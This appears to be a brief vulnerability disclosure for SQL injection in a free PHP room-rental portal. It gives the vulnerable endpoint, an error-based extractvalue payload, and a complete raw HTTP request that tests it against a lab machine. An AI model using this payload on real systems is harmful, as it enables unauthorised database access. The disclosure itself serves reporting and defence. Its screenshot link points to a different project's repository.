# room-rent-portal-site v1.0 has SQL injection

vendors: https://www.sourcecodester.com/php/15301/room-rent-portal-site-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /rrps/classes/Master.php?f=delete_category

Vulnerability location:/rrps/classes/Master.php?f=delete_category, id

[+] Payload: 2'and/**/extractvalue(1,concat(char(126),database()))and'

Tested on Windows 10, XAMPP

```
POST http://192.168.2.106/rrps/classes/Master.php?f=delete_category HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://192.168.2.106
Connection: keep-alive
Referer: http://192.168.2.106/rrps/admin/?page=categories
Cookie: PHPSESSID=h4hpbcj74nsiroalrkj8o2251s

id=2'and/**/extractvalue(1,concat(char(126),database()))and'
```

![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/sql.gif?raw=true)

